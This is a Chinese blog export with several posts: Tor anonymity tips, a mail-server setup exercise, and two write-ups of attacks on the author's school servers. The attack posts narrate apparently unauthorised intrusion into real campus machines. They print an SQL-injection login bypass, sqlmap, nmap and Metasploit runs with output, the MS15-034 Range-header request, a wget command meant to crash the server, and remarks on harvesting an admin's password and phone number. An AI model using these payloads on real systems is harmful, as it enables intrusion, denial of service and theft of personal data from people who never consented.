前一节点发出的 Tor 流量 将要访问的网站 而网站的人员可以知道： Tor 流量访问了本网站 以及账号密码 再加访问的页面数据 这种方案，不难发现同仅使用 Tor 方案一样；其弊端就在于，始终会被其他人发现处于你这 IP 位置的人正在使用 Tor 网络。 Tor &amp; obfs4 + 前置代理所以就有了此种方案。 obfs4 使 Tor 流量看起来是随机的，并且还防止检查程序通过互联网扫描找到网桥。 当然 obfs4 可以换成其他可插拔传输器，例如 meek-azure 使您看起来像在使用 Microsoft 网站，以及 snowflake。 再加套上一个前置代理 Shadowsocks 隐藏真正的公网 IP。 HTTPS 就是必然了，因为使用此方案去访问 HTTP 网站，那些明文数据(用户名密码/网页内容)仍然会被劫持到。(推荐 HTTPS Everywhere 浏览器插件) 当然此方案仍然需要注意： JavaScript 脚本可以绕过代理获取真实 IP 的，所以说需要禁用 JavaScript。(Noscript 插件) WebRTC，一个实现网页实时语音或视频对话以及P2P文件分享的浏览器 API；可以在使用VPN或设置好浏览器代理的情况下泄露真实 IP 和 内网 IP。 Referencehttps://support.torproject.org/misc/misc-2/ https://en.wikipedia.org/wiki/Tor_(anonymity_network) https://wiki.archlinux.org/index.php/Tor https://tb-manual.torproject.org/circumvention/ https://media.torproject.org/misc/2015-03-tor-brochure/tor-brochure-en.pdf","categories":[],"tags":[{"name":"Tor","slug":"Tor","permalink":"https://fanqxu.github.io/tags/Tor/"}]},{"title":"SQL注入之校园监控器","slug":"SQLi-FirstTest","date":"2019-10-14T03:26:46.000Z","updated":"2020-06-03T12:15:16.000Z","comments":true,"path":"2019/10/14/SQLi-FirstTest/","link":"","permalink":"https://fanqxu.github.io/2019/10/14/SQLi-FirstTest/","excerpt":"","text":"由于是在学校内网中，并且对所造成的危害貌似【并不】很严重！ 一些敏感信息也懒得打马了；主要是为对 SQL 注入以及 sqlmap 工具的使用、练习。 0x00 前言原本是在备赛练习 SQL 注入相关习题中；在此墙裂推荐一个【系统性】练习 SQL 注入的靶场！ SQLI-LABSGithub：https://github.com/Audi-1/sqli-labs 部署靶场环境不需很麻烦；比如说直接使用 docker 两条命令的事。 # docker pull acgpiano/sqli-labs # docker run -it -d -p 8080:80 acgpiano/sqli-labs 当然也可以到本人收集的 Lab 页面找到公网上别人搭建好的这个靶场。 其实，并不推荐使用别人的靶机；因为局限性是你无法直接使用其系统，这就会导致你无法完成一些操作，比如阅读、修改源码加固系统。 更不要在刚开始学的时候，就拿公网上别人公司服务器来搞！ 可能并不那么好找不到，这会打击信心。 可能造成无法挽回的损失，法律纠纷。 这确实很不道德！ 0x01 步入正题但是我怎么会就局限于靶机捏？遂就拿身边发现的学校一台 Web 服务器来练手；前面胡扯了一大堆废话，接下来真正到了渗透时刻！！！ 监控系统首先，不得不说的是目标 Web 服务仅仅只是个【监控系统】；这也说明了即使将其攻破，危害性并不大；而究竟是监控啥的，后面等进去了再说…… 登录截包注入先在用户名提交框中输入一个单引号 &#39;，看看 Web Application 返回的响应； 如下图，发现已经出现【报错】了。并且 URL 框没有任何变化，初步判断这里有存在 POST 类型注入的可能性！ class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g7xrsgda2xj30sg0li74m.jpg\" 在此，直接使用 BurpSuite 来截取登录的数据包。 POST /user_cs.asp?type=login HTTP/1.1 Host: 192.168.252.10 Content-Length: 32 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://192.168.252.10 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 DNT: 1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://192.168.252.10/ Accept-Encoding: gzip, deflate Accept-Language: zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close username=admin&amp;password=MTIzNDU2 可以发现确实是 POST 方式提交数据 ；原本输入的密码123456被编码成了MTIzNDU2。然并卵！就被进行了一次 base64 编码。其实这里无所谓了。 直接尝试注入万能密码 &#39; or 1=1 -- +来进行登录，经过不断尝试，参数username安全，但【password】就存在注入了。 首先先对万能密码 &#39; or 1=1 -- +进行 URL 编码，编码后就是这%20%27%20%6f%72%20%31%3d%31%20%2d%2d%20%2b么一长串。 然后使用 BurpSuite 将数据包发出去，返回浏览器界面而发现已经登录进去了。 POST /user_cs.asp?type=login HTTP/1.1 Host: 192.168.252.10 Content-Length: 32 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://192.168.252.10 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 DNT: 1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://192.168.252.10/ Accept-Encoding: gzip, deflate Accept-Language: zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close username=admin&amp;password=MTIzNDU2%20%27%20%6f%72%20%31%3d%31%20%2d%2d%20%2b SQLMAP将最原始的那个 POST 数据包保存到本地的一个文件post.txt里，尝试使用工具来注入。 # sqlmap -r post.txt -p &#39;password&#39; --random-agent ___ __H__ ___ ___[.]_____ ___ ___ &#123;1.3.10#stable&#125; |_ -| . [.] | .&#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [*] starting @ 14:16:53 /2019-10-14/ [14:16:53] [CRITICAL] specified HTTP request file &#39;post.txt&#39; does not exist [*] ending @ 14:16:53 /2019-10-14/ 出现错误 specified HTTP request file ‘post.txt’ does not exist，原因是找不到此文件；这里的解决方法就是，得将这个文件放入sqlmap的安装根目录，例如 Kali 的/usr/share/sqlmap/、Arch 的 /opt/sqlmap/ 中。 再来…… # sqlmap -r post.txt -p &#39;password&#39; --random-agent [14:27:16] [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) [14:27:16] [CRITICAL] connection dropped or unknown HTTP status code received …………………… …………………… [14:27:35] [WARNING] POST parameter &#39;password&#39; does not seem to be injectable 再次使用 URL 方式跑…… # sqlmap -u &quot;http://192.168.252.10/user_cs.asp?type=login&quot; --data=&quot;username=admin&amp;password=MTIzNDU2&quot; -p &quot;password&quot; --random-agent 报错和上面一样，反正也不行，这个 Web Application 着实奇怪，后端数据库使用的是SQLite。这种数据库不是一个【客户端/服务器】结构的数据库引擎，而是被集成在用户程序中；不太懂。 POST 提交表单后，如果登录不成功，就回到登录页面；成功会 GET 请求几个页面，然后进去。 无奈！ sqlmap 白拿出来用了，这个登录界面只能【手动注入】…… 一点小收获此时只能通过手动注入登录进去，进去后才发现这貌似仅只是个环境监控系统。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g7xrsycgzlj30yt0hyt9d.jpg\" 而在右上角设置页面发现了页面缓存。F12打开【开发者工具】，将type=password修改为type=text，如下发现管理员的【浪漫密码】以及【电话号码】，管理员的【密码习惯】以及【联系方式】被暴露会引发后续的【社会工程学】攻击。 当然对于社会工程学，俺学疏才浅，在这里就此搁浅了； 而这个 Web 应用；就目前来说，就发现了一个登录界面的注入。 也不想再去【黑盒审计】了。就酱紫～～:( 0x02 后续针对主机层面的扫描…… sudo nmap -n -sS -sV -T4 -O 192.168.252.10 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:59 CST Nmap scan report for 192.168.252.10 Host is up (0.0038s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp oftpd 23/tcp open telnet Pocket CMD telnetd 80/tcp open http ChipPC Extreme httpd 135/tcp filtered msrpc 139/tcp filtered netbios-ssn 443/tcp open tcpwrapped 445/tcp filtered microsoft-ds Service Info: OSs: Unix, Windows CE 5.0; CPE: cpe:/o:microsoft:windows_ce 操作系统这里的操作系统应该是 Windows CE 5.0，微软研发的【嵌入式】操作系统。详见其 维基百科。 FTP额！这里的 FTP 允许匿名登录；Name得随便写一个，Password随便输入。就这样子进去了 *_* # ftp 192.168.252.10 Connected to 192.168.252.10. 220 Service ready for new user. Name (192.168.252.10:f4n9x): f4n9x@gmail.com 331 User name okay, need password. Password: 230 User logged in, proceed. Remote system type is Windows_CE. ftp&gt; TELNET这里更奇葩！Telnet 也是无密码连接；直接登录、控制系统 :) # telnet 192.168.252.10 Trying 192.168.252.10... Connected to 192.168.252.10. Escape character is &#39;^]&#39;. Welcome to the Windows CE Telnet Service on WindowsCE Pocket CMD v 5.0 \\&gt; help 以下命令可用: ATTRIB 设置/显示文件属性。 CALL 调用批处理脚本。 CD 更改目录。 DATE 显示/设置系统日期。 DEL 删除文件。 DIR 打印目录内容。 ………………………… SET 设置或列出环境变量。 SHIFT 批处理文件的 Shift 参数。 START 启动分离进程。 TIME 显示/更改系统时间。 TITLE 设置 CMD.EXE 会话的窗口标题。 TYPE 将文件内容输出到屏幕。 使用 HELP [命令名]显示给定命令的扩展帮助，或使用 HELP CMD 显示常规主题(如 命令输入选项、I/O 重定向或 CMD 参数)的帮助。 没话说哎！我连【反弹木马】都懒得传上去了。担心系统性能不高，弄不好蓝屏就叽叽了。 不过话说回来，如果真的控制了这台机子。然后拿它做跳板，那内网核心网段服务器是否都可能会遭殃呢？这取决于管理员是否勤不勤快打补丁咯！","categories":[],"tags":[{"name":"SQLi","slug":"SQLi","permalink":"https://fanqxu.github.io/tags/SQLi/"}],"author":"F4n9X"},{"title":"记录一次邮件服务的部署过程","slug":"Email-server","date":"2019-09-09T10:14:28.000Z","updated":"2021-05-31T09:08:01.453Z","comments":true,"path":"2019/09/09/Email-server/","link":"","permalink":"https://fanqxu.github.io/2019/09/09/Email-server/","excerpt":"","text":"完成 E-MAIL 服务器部署1.在此服务器上安装配置邮件服务，具体要求为： （1）创建三个邮箱用户 mail4，mail5，mail6，用户密码为789，不允许本地登录； （2）邮件服务器的域名后缀为 netskills.net，邮件服务器要在所有IP地址上进行侦听； （3）为拒绝垃圾邮件，设置邮件服务器的黑名单，拒绝接收用户 mail5 的邮件； 2.创建自签名 SSL 证书，配置邮件服务器的mail 连接。具体要求为： （1）密钥路径为 /etc/pki/tls/certs/server.key； （2）证书路径为 /etc/pki/tls/certs/server.crt； （3）设置仅支持 smtps 和 pop3s 协议连接； 一道赛题！由于在此之前，本人对于【邮件服务】相关知识没有一丝了解。以至于被此题折磨了一天，特在此记录一下。 DNS 解析大法部署邮件服务前，需要将 DNS 服务配置完毕；为电子邮件系统提供域名解析。 配置服务器主机名称,需要保证服务器主机名称与发信域名保持一致。 [root@localhost ~]# hostnamectl set-hostname mail.netskills.net 关闭防火墙及 SElinux。 [root@mail ~]# systemctl stop firewalld [root@mail ~]# systemctl disable firewalld [root@mail ~]# setenforce 0 [root@mail ~]# getenforce Permissive 安装 bind 包，修改主配置文件。 [root@mail ~]# yum install bind [root@mail ~]# vim /etc/named.conf options &#123; listen-on port 53 &#123; any; &#125;; listen-on-v6 port 53 &#123; ::1; &#125;; directory &quot;/var/named&quot;; dump-file &quot;/var/named/data/cache_dump.db&quot;; statistics-file &quot;/var/named/data/named_stats.txt&quot;; memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; allow-query &#123; any; &#125;; ……………………省略…………………… 修改区域配置文件和数据配置（正向/反向）文件。 [root@mail ~]# vim /etc/named.rfc1912.zones zone &quot;netskills.net&quot; IN &#123; type master; file &quot;netskills.net.zone&quot;; allow-update &#123; none; &#125;; &#125;; ……………………省略…………………… zone &quot;10.168.192.in-addr.arpa&quot; IN &#123; type master; file &quot;reverse.netskills.net&quot;; allow-update &#123; none; &#125;; &#125;; ……………………省略…………………… [root@mail ~]# cp -p /var/named/named.localhost /var/named/netskills.net.zone [root@mail ~]# vim /var/named/netskills.net.zone $TTL 1D @ IN SOA netskills.net. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS ns.netskills.net. ns A 192.168.10.101 @ MX 10 mail.netskills.net. mail A 192.168.10.101 [root@mail ~]# cp -p /var/named/named.loopback /var/named/reverse.netskills.net [root@mail ~]# vim /var/named/reverse.netskills.net $TTL 1D @ IN SOA netskills.net. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS mail.netskills.net. A 127.0.0.1 101 PTR mail.netskills.net. 重启服务并为本地设置 DNS 服务器。 [root@mail ~]# systemctl restart named [root@mail ~]# systemctl enable named [root@mail ~]# cat /etc/resolv.conf nameserver 192.168.10.101 验证： [root@mail ~]# nslookup &gt; mail.netskills.net Server: 192.168.10.101 Address: 192.168.10.101#53 Name: mail.netskills.net Address: 192.168.10.101 &gt; set q=mx &gt; 192.168.10.101 Server: 192.168.10.101 Address: 192.168.10.101#53 101.10.168.192.in-addr.arpa name = mail.netskills.net. Email 服务邮件传输软件安装 Postfix，其是一种电子邮件服务器；为改良 sendmail 而产生。 [root@mail ~]# yum install postfix Postfix 可以调用本地系统的账户和密码，因此在本地系统创建常规账户即可。 [root@mail ~]# useradd mail4 [root@mail ~]# useradd mail5 [root@mail ~]# useradd mail6 [root@mail ~]# echo &quot;789&quot; | passwd --stdin mail4 [root@mail ~]# echo &quot;789&quot; | passwd --stdin mail5 [root@mail ~]# echo &quot;789&quot; | passwd --stdin mail6 # 这种方式给用户设置密码并不推荐，不太安全 [root@mail ~]# usermod -s /sbin/nologin mail4 [root@mail ~]# usermod -s /sbin/nologin mail5 [root@mail ~]# usermod -s /sbin/nologin mail6 修改并完善主配置文件。 [root@mail ~] # vim /etc/postfix/main.cf myhostname = mail.netskills.net # mydomain 变量其实就是邮箱地址后缀 mydomain = netskills.net myorigin = $mydomain inet_interfaces = all mydestination = $myhostname, $mydomain mynetworks = 192.168.10.0/24, 127.0.0.0/8 home_mailbox = Maildir/ [root@mail ~]# systemctl restart postfix [root@mail ~]# systemctl enable postfix 设置邮件服务黑名单策略，拒收来自 mail5 用户的邮件。 [root@mail ~]# echo &quot;smtpd_sender_restrictions = check_sender_access hash:/etc/postfix/sender_access&quot; &gt;&gt; /etc/postfix/main.cf [root@mail ~]# echo &quot;mail5@netskills.net REJECT&quot; &gt;&gt; /etc/postfix/sender_access [root@mail ~]# cat /etc/postfix/sender_access mail5@netskills.net REJECT [root@mail ~]# postmap /etc/postfix/sender_access [root@mail ~]# systemctl restart postfix.service 验证： [root@mail ~]# yum install telnet [root@mail ~]# telnet localhost smtp Trying ::1... Connected to localhost. Escape character is &#39;^]&#39;. 220 mail.netskills.net ESMTP Postfix helo localhost 250 mail.netskills.net MAIL FROM: mail5@netskills.net 250 2.1.0 Ok RCPT TO: mail4@netskills.net 554 5.7.1 &lt;mail5@netskills.net&gt;: Sender address rejected: Access denied 创建自签名 SSL 证书。文件后缀：.key：一般指私钥文件。 .csr：证书请求文件。 .crt：证书文件，certificate 的缩写。 关于【证书申请文件】（CSR）；首先需要先创建一个【私钥】（key），根据私钥生成 CSR。CSR 的主要内容是密钥对中的公钥，以及一些额外的信息 —— 最后这些内容都将在签名时插入到证书里。 创建一个【秘/私钥】，通过回显可以看出还是调用 openssl 命令生成的私钥。 [root@mail ~]# cd /etc/pki/tls/certs/ [root@mail certs]# make server.key umask 77 ; \\ /usr/bin/openssl genrsa -aes128 2048 &gt; server.key Generating RSA private key, 2048 bit long modulus .........................+++ .+++ e is 65537 (0x10001) Enter pass phrase: # dcncloud Verifying - Enter pass phrase: # dcncloud # 从私钥中删除密码 [root@mail certs]# openssl rsa -in server.key -out server.key Enter pass phrase for server.key: # dcncloud writing RSA key 根据私钥 server.key 生成证书申请文件 server.csr。 [root@mail certs]# make server.csr umask 77 ; \\ /usr/bin/openssl req -utf8 -new -key server.key -out server.csr You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter &#39;.&#39;, the field will be left blank. ----- Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:Shanghai Locality Name (eg, city) [Default City]:W Organization Name (eg, company) [Default Company Ltd]:DCN Organizational Unit Name (eg, section) []:netskills Common Name (eg, your name or your server&#39;s hostname) []:netskills.net Email Address []:root@netskills.net Please enter the following &#39;extra&#39; attributes to be sent with your certificate request A challenge password []: # 回车 An optional company name []: # 回车 使用私钥 server.key 对证书申请进行签名从而生成证书 server.crt 。 [root@mail certs]# openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650 Signature ok subject=/C=CN/ST=Shanghai/L=W/O=DCN/OU=netskills/CN=netskills.net/emailAddress=root@netskills.net Getting Private key [root@mail certs]# ls ca-bundle.crt make-dummy-cert renew-dummy-cert server.csr ca-bundle.trust.crt Makefile server.crt server.key 关于 SMTPSSMTPS（Simple Mail Transfer Protocol Secure）是一种使用传输层安全性保护 SMTP 的方法。它旨在提供通信伙伴的身份验证，以及数据完整性和机密性。 SMTPS 不是专有协议，也不是 SMTP 的扩展。通过将 SMTP 包装在 TLS 中，这是一种在传输层保护 SMTP 的方法。从概念上讲，它类似于 HTTPS ；在 TLS 中包装 HTTP 的方式。 参考来源：https://en.wikipedia.org/wiki/SMTPS 为什么启用 SMTPS ? ? ?用作提交协议的 SMTPS 令人困惑，让我解释，最初于1997年，IANA（互联网号码分配机构）为 SMTPS 分配了465端口，旨在用于加密一个 SMTP 服务器与另一个 SMTP 服务器之间的通信，如 mail.google.com 和 mail.yahoo.com，后来，STARTTLS 出现了，它允许 SMTP 服务器通过现有的 SMTP 端口25安全地相互通信，因此不再需要将465端口专用于安全 SMTP，SMTPS 端口已被撤销，但是，某些邮件客户端（如Microsoft Outlook）错误地将 SMTPS 解释为提交，并使用465端口进行电子邮件提交，直到今天仍然如此。 参考来源：https://ywnz.com/linuxyffq/4817.html。 哦！原来这是个已弃用的协议？ 编辑 postfix 主配置文件，添加 SMTP 认证相关的 SASL 功能参数以及 SSL 证书路径。 [root@mail ~]# vim /etc/postfix/main.cf # SMTP-Auth smtpd_sasl_type = dovecot smtpd_sasl_path = private/auth smtpd_sasl_auth_enable = yes smtpd_sasl_security_options = noanonymous smtpd_sasl_local_domain = $myhostname # SSL smtpd_use_tls = yes smtpd_tls_cert_file = /etc/pki/tls/certs/server.crt smtpd_tls_key_file = /etc/pki/tls/certs/server.key 编辑 postfix 的 master 进程配置文件，取消相关注释；使其对 SMTPS 的支持。 [root@mail ~]# vim /etc/postfix/master.cf submission inet n - n - - smtpd -o syslog_name=postfix/submission smtps inet n - n - - smtpd -o syslog_name=postfix/smtps -o smtpd_tls_wrappermode=yes -o smtpd_sasl_auth_enable=yes [root@mail ~]# systemctl restart postfix 可以看出 SMTPS 默认端口465是帧听状态滴。 [root@mail ~]# netstat -pantu | grep master tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN 12816/master tcp 0 0 0.0.0.0:587 0.0.0.0:* LISTEN 12816/master tcp 0 0 0.0.0.0:465 0.0.0.0:* LISTEN 12816/master tcp6 0 0 :::25 :::* LISTEN 12816/master tcp6 0 0 :::587 :::* LISTEN 12816/master tcp6 0 0 :::465 :::* LISTEN 12816/master 关于 POP3SPOP3S (POP3-over-SSL/TLS) 是指用于将电子邮件传输协议 POP3 扩展为 SSL / TLS 加密的网络协议。通常，POP3S 默认在端口 995 上使用 TCP。 POP3S 默认端口 995；连接方式为 SSL / TLS， STARTTLS 不可用。认证方式为普通密码。 Why POP3S ? ? ?虽然 POP3 服务器要求客户端使用用户名和密码进行身份验证，但由于 POP3 是一种未加密的协议；用户名密码都是【明文传输】滴！ POP3S is POP3 over SSL/TLS。它为邮件协议提供了一个【加密连接】，通过该连接可以传输用户名和密码以进行身份验证。 开源 POP3 服务器安装 dovecot（一款开源 IMAP、POP3 服务器），编辑其配置文件。 [root@mail ~]# yum install dovecot [root@mail ~]# vim /etc/dovecot/dovecot.conf # 由题要求，仅配置 pop3 协议支持 protocols = pop3 listen = * 编辑认证配置文件。 [root@mail ~]# vim /etc/dovecot/conf.d/10-auth.conf # 允许明文认证 disable_plaintext_auth = no 邮件的相关配置。 [root@mail ~]# vim /etc/dovecot/conf.d/10-mail.conf # 用户邮件存放的目录 mail_location = maildir:~/Maildir 认证相关配置。 [root@mail ~]# vim /etc/dovecot/conf.d/10-master.conf # pop3s auth service pop3-login &#123; inet_listener pop3 &#123; port = 0 &#125; inet_listener pop3s &#123; port = 995 ssl = yes &#125; &#125; # Postfix smtp-auth unix_listener /var/spool/postfix/private/auth &#123; mode = 0666 user = postfix group = postfix &#125; 证书相关配置。 [root@mail ~]# vim /etc/dovecot/conf.d/10-ssl.conf ssl = yes ssl_cert = &lt;/etc/pki/tls/certs/server.crt ssl_key = &lt;/etc/pki/tls/certs/server.key 查看端口，可以看出仅帧听了默认端口为995的 POP3S。 [root@mail ~]# netstat -pantu | grep dovecot tcp 0 0 0.0.0.0:995 0.0.0.0:* LISTEN 13300/dovecot 验证环节验证使用 Windows 上的一款 Thundbird 邮件客户端。 当网络及 DNS 等一切设置正常后；打开客户端软件会自动弹出这个【添加安全例外】，因为证书是自签名，并不被客户端信任。请疯狂点击 确认安全例外。 然后开始登录邮箱用户。如下图所示，POP3S(POP3-over-SSL/TLS) 默认端口为995，SMTPS(SMTP+TLS) 默认端口为465；验证方式为普通密码。直接点击完成，不必重新测试。 如下，当用户发送邮件时可能弹出以下界面；同上，自签名证书不被信任。 测试发送邮件。 成功接受邮件！！！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://fanqxu.github.io/tags/linux/"}],"author":"F4n9X"},{"title":"针对校园某服务器的一次渗透测试","slug":"PenTest","date":"2019-08-13T16:00:00.000Z","updated":"2020-06-03T12:20:27.000Z","comments":true,"path":"2019/08/14/PenTest/","link":"","permalink":"https://fanqxu.github.io/2019/08/14/PenTest/","excerpt":"发现学校其中一台服务器可能（绝对）存在漏洞。我想（绝对）能拿下它； 而且渗透测试的过程很有趣，便将其记录下来。","text":"发现学校其中一台服务器可能（绝对）存在漏洞。我想（绝对）能拿下它； 而且渗透测试的过程很有趣，便将其记录下来。 0x00 前期交互及信息收集由于是对内网直接进行大扫描，所以直接判断这不仅是一个 Web 服务器（多个），同时还运行着 FTP、数据库。 在此，再次使用 nmap 扫描一次，结果如下： $ sudo nmap -T4 -n -sS -sV -O 192.168.3.72 Nmap scan report for 192.168.3.72 Host is up (0.00076s latency). Not shown: 974 closed ports PORT STATE SERVICE VERSION 7/tcp open echo 9/tcp open discard? 13/tcp open daytime? 17/tcp open qotd Windows qotd (English) 19/tcp open chargen 21/tcp open ftp FileZilla ftpd 42/tcp open tcpwrapped 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp filtered msrpc 139/tcp filtered netbios-ssn 445/tcp filtered microsoft-ds 999/tcp open http Apache httpd 2.4.33 ((Win32) OpenSSL/1.0.2o mod_fcgid/2.3.9 mod_jk/1.2.40) 1801/tcp open msmq? 2107/tcp open msrpc Microsoft Windows RPC 2383/tcp open ms-olap4? 3306/tcp open mysql MySQL 5.5.19 3389/tcp open ms-wbt-server? 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 8082/tcp open http Microsoft IIS httpd 7.5 49152/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port13-TCP:V=7.70%I=7%D=8/13%Time=5D53656C%P=x86_64-unknown-linux-gnu%r SF:(NULL,12,&quot;23:35:37\\x202019/8/13\\n&quot;)%r(NCP,12,&quot;23:35:37\\x202019/8/13\\n&quot;); Device type: general purpose Running: Microsoft Windows Vista|2008|7 OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_7 OS details: Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 乍一看，跑了这么多服务。初步判断很可能有 vulnerabilities。 总结，这是一台操作系统为 Windows（目前未能确认具体版本）的、运行着 FileZilla FTP、MySQL 5.5.19、Web等服务；而且开放了太多端口。 Web 服务器端口：80、999、8080、8082；运行着这么几个 Web 服务。 不过经确认，只有 999 Apache 和 8082 IIS 两个端口提供的 Web 服务正常。 且，999 端口运行着 phpMyAdmin（一个以 PHP 为基础，以 Web-Base 方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库），当然也是漏洞多多。 0x01 远程代码执行？？？在我一顿瞎几掰操作下，其实是利用扫描器加手动验证；找到一个致命漏洞，该漏洞存在于端口 8082 IIS 服务器上。 MS15-034 复现HTTP.sys 远程执行代码漏洞 - CVE-2015-1635 当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。 若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理请求的方式，此更新可以修复此漏洞。 详细 根据微软安全公告，此漏洞貌似可以远程任意代码执行；但就实际复现来说，好像并不成立。 通过给 IIS 服务器发送如下 HTTP 请求，便可触发这个漏洞。 GET / HTTP/1.1 Host: stuff Range: bytes=0-18446744073709551615 而我就直接使用的 wget 测试此漏洞，当然还可以使用 curl 和 MSF。 $ wget --header=&quot;Range: bytes=0-18446744073709551615&quot; http://192.168.3.72:8082/Images/top01.gif --2019-08-13 23:44:03-- http://192.168.3.72:8082/Images/top01.gif Connecting to 192.168.3.72:8082... connected. HTTP request sent, awaiting response... 416 Requested Range Not Satisfiable The file is already fully retrieved; nothing to do. 如上请求包，若IIS服务器返回 “Requested Range Not Satisfiable“，则是存在漏洞，否则如果返回 “The request has an invalid header name”，则说明漏洞已经修补。 进一步利用/危害前面的远程任意代码执行并不成立；此漏洞就当前利用来说，只能造成两种危害。 我使用 MSF 来 exploit 利用方式。 如下，使用 MSF 读取服务器内核内存数据。 msf5 &gt; use auxiliary/scanner/http/ms15_034_http_sys_memory_dump msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set RHOSTS 192.168.3.72 msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set RPORT 8082 msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set TARGETURI /Images/top01.gif msf5 auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; exploit [+] Target may be vulnerable... [+] Stand by... [-] Memory dump start position not found, dumping all data instead [+] Memory contents: 48 54 54 50 2f 31 2e 31 20 34 30 30 20 42 61 64 |HTTP/1.1 400 Bad| 20 52 65 71 75 65 73 74 0d 0a 43 6f 6e 74 65 6e | Request..Conten| 74 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d |t-Type: text/htm| 6c 3b 20 63 68 61 72 73 65 74 3d 75 73 2d 61 73 |l; charset=us-as| 63 69 69 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63 |cii..Server: Mic| … … … … … … … … … 72 6f 73 6f 66 74 2d 48 54 54 50 41 50 49 2f 32 |rosoft-HTTPAPI/2| 45 72 72 6f 72 20 34 30 30 2e 20 54 68 65 20 72 |Error 400. The r| 65 71 75 65 73 74 20 68 6f 73 74 6e 61 6d 65 20 |equest hostname | 69 73 20 69 6e 76 61 6c 69 64 2e 3c 2f 70 3e 0d |is invalid.&lt;/p&gt;.| 0a 3c 2f 42 4f 44 59 3e 3c 2f 48 54 4d 4c 3e 0d |.&lt;/BODY&gt;&lt;/HTML&gt;.| 0a |.| [+] Memory dump saved to /home/f4n9x/.msf4/loot/20190814122223_default_192.168.3.72_iis.ms15034_317502.bin [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 第二种，我直接使用 wget 命令。 $ wget --header=&quot;Range: bytes=18-18446744073709551615&quot; http://192.168.3.72/Images/top01.gif 在敲这条命令时，我双手一直是抖的🙃🙃。 这条命令回车下去直接对服务器造成 DoS 攻击，服务器必定假死或蓝屏；我就不回车了…… 此漏洞利用，就到此为止咯。。。 0x02 由 phpMyAdmin 入手还不甘心，难道仅仅只能让此服务器蓝屏重启吗？？？ 得想想办法拿到最高控制权！！！ 再次整理思路…… phpMyAdmin URL 主页：192.168.3.72:999 目录爆破首先使用了 nikto 扫描了此站是否还有其他目录。 $ nikto -host http://192.168.3.72:999/ - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.3.72 + Target Hostname: 192.168.3.72 + Target Port: 999 + Start Time: 2019-08-13 23:55:43 (GMT8) --------------------------------------------------------------------------- + Server: Apache/2.4.33 (Win32) OpenSSL/1.0.2o mod_fcgid/2.3.9 mod_jk/1.2.40 + Retrieved x-powered-by header: PHP/5.3.29 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + Uncommon header &#39;x-ob_mode&#39; found, with contents: 0 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x4e4e67f49da00 + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details. + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-3092: /setup/: This might be interesting... + OSVDB-3092: /README: README file found. + OSVDB-3233: /icons/README: Apache default file found. + 8348 requests: 0 error(s) and 17 item(s) reported on remote host + End Time: 2019-08-13 23:56:50 (GMT8) (67 seconds) --------------------------------------------------------------------------- + 1 host(s) tested 重点在 “+ OSVDB-3092: /setup/: This might be interesting…“，这一条。 setup 